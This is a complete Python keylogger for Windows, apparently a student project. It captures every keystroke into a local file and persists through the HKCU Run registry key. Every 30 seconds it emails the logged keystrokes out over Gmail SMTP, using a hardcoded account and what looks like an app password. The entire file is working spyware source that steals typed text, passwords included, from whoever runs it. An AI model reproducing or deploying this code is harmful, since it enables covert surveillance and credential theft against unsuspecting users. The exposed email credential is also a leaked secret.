import pynput.keyboard as keyboard
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import os
import threading
import winreg as reg
import sys

destiny = 'C:/Users/susan/Documents/PracticaFinalKL-main/PracticaFinalKL-main/keylogs.txt'

sender_email = "proyectokeyloggeralgmal@gmail.com"
receiver_email = "proyectokeyloggeralgmal@gmail.com"
password = "qipc pxcf sjev moks"

def send_email():
    while True:
        try:
            if os.path.getsize(destiny) > 0:
                with open(destiny, 'r') as file:
                    data = file.read()
                
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = 'Keylogger Logs'
                msg.attach(MIMEText(data, 'plain'))
                
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.ehlo()
                server.starttls()
                server.login(sender_email, password)
                server.send_message(msg)
                server.quit()
                print("Email sent successfully")
                
                open(destiny, 'w').close()
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(30)

def add_to_registry():
   exe_path = os.path.join(os.getcwd(), sys.argv[0])
   key = r"Software\Microsoft\Windows\CurrentVersion\Run"
   
   try:
       registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
       reg.SetValueEx(registry_key, "MyKeylogger", 0, reg.REG_SZ, exe_path)
       reg.CloseKey(registry_key)
       print(f"Keylogger added to startup: {exe_path}")
   except Exception as e:
       print(f"Registry error: {e}")

def on_press(key):
   logging.basicConfig(filename=destiny, level=logging.DEBUG, format='%(message)s')
   try:
       if key == keyboard.Key.space:
           logging.log(10, ' ')
           print('Key: Space')
       elif key == keyboard.Key.enter:
           logging.log(10, '\n')
           print('Key: Enter')
       elif key == keyboard.Key.backspace:
           with open(destiny, 'r') as file:
               data = file.read()
           data = data[:-1]
           with open(destiny, 'w') as file:
               file.write(data)
       else:
           logging.log(10, key.char)
           print('Key: {0}'.format(key))
   except AttributeError:
       pass

def start():
   with keyboard.Listener(on_press=on_press) as listener:
       listener.join()

if not os.path.exists(destiny):
   open(destiny, 'w').close()

threading.Thread(target=send_email).start()
add_to_registry()
start()
